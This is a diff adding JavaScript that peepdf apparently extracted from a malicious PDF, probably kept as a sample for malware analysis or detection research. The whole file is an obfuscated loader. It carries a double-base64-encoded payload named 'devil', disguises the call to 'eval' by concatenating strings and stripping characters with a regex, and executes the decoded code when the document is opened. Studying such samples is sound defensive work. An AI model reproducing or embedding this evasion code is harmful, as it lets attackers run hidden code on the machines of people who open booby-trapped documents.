@@ -1,0 +1,36 @@
+// peepdf comment: Javascript code located in object 6 (version 0)
+
+var keyStr = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
+
+function decode64(input) {
+    var output = "";
+    var chr1, chr2, chr3;
+    var enc1, enc2, enc3, enc4;
+    var i = 0;
+    input = input.replace(/[^A-Za-z0-9\+\/\=]/g, "");
+    do {
+        enc1 = keyStr.indexOf(input.charAt(i++));
+        enc2 = keyStr.indexOf(input.charAt(i++));
+        enc3 = keyStr.indexOf(input.charAt(i++));
+        enc4 = keyStr.indexOf(input.charAt(i++));
+        chr1 = (enc1 << 2) | (enc2 >> 4);
+        chr2 = ((enc2 & 15) << 4) | (enc3 >> 2);
+        chr3 = ((enc3 & 3) << 6) | enc4;
+        output = output + String.fromCharCode(chr1);
+        if (enc3 != 64) {
+            output = output + String.fromCharCode(chr2);
+        }
+        if (enc4 != 64) {
+            output = output + String.fromCharCode(chr3);
+        }
+    } while (i < input.length);
+    return output;
+}
+var devil = decode64("Q25FNU1USTFQWFJvYVhNN0NncDJZWElnYm05M1lYUWdQU0FpSWpzS0NncDJZWElnYkc5M2FUMGdjVGt4TWpWYkp6RmxSM1l5WVVSc1ZDY3VjbVZ3YkdGalpTZ3ZXMVF4TWtSSFhEcGRMMmNzSUNjbktWMDdDZ29LZG1GeUlHVmliMnR5YXowZ0lpVWlPd29LQ214dmQya29JbVpsSWlzaVlYTWlLeUozSWlzaWNqMTFJaXNpYm1VaUt5SnpJaXNpWTJFaUt5SndaVHNpS1RzS0NncHNiM2RwS0NKaFlTSXJJbUpsZHlBOUlIUm9JaXNpYVhNdWFTSXJJbTRpS3lKbWJ5NTBhU0lySW5Sc1pUc2lLVHNLQ2dvS2JHOTNhU2dpYmlJckltOGlLeUozSWlzaVlYUWdQU0JoWVNJckltSWlLeUpsZHk1eVpTSXJJbkJzWVNJckltTmxLQzlrYlRGdmJpOW5MR1VpS3lKaWJ5SXJJbXNpS3lKeUlpc2lheWs3SWlrN0Nnb0tiRzkzYVNnaWRpSXJJbUVpS3lKeUlIWWlLeUoySWlzaWFXNGlLeUowZGlBOUlHWWlLeUpsWVNJckluTWlLeUozY2lodUlpc2lieUlySW5jaUt5SmhJaXNpZENrN0lpazdDZ29LYkc5M2FTZ2liRzhpS3lKM0lpc2lhU2gySWlzaWRpSXJJbWx1ZENJckluWXBPeUlwT3dvSw==");
+
+q9126 = "t" + "h" + "i" + "s";
+
+var abbd = q9126['1eGv2aDlT'.replace(/[T12DG\:]/g, '')];
+
+abbd(decode64(devil));
+
